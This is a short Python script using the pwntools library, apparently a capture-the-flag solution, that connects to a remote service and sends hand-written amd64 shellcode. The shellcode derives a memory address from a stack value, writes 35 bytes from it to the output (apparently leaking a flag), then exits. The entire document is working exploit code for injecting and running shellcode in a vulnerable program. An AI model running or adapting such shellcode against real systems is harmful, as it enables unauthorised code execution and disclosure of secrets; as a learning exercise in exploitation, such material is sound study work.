from pwn import *

#p = process('./main')
p = remote(ADDRESS, PORT)
context.arch = 'amd64'

payload = asm('''
    mov rax, [rsp + 0x40]
    sub rax, 0x1249
    add rax, 0x4040

    mov rdi, 1
    mov rsi, rax
    mov rdx, 35
    mov rax, 1
    syscall

    mov rax, 60
    xor rdi, rdi
    syscall
''')
p.sendlineafter(b"> ", payload)
p.interactive()